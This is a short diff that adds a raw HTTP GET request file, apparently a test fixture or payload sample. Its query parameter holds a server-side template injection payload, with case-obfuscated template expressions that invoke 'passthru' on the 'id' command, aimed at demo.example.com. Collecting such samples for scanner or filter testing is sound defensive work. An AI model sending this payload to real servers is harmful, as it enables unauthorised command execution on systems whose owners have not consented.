@@ -1,0 +1,4 @@
+GET /a?data={{%20dUmP()%20}}{{%20['iD']|mAp('PaSsThRu')%20}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
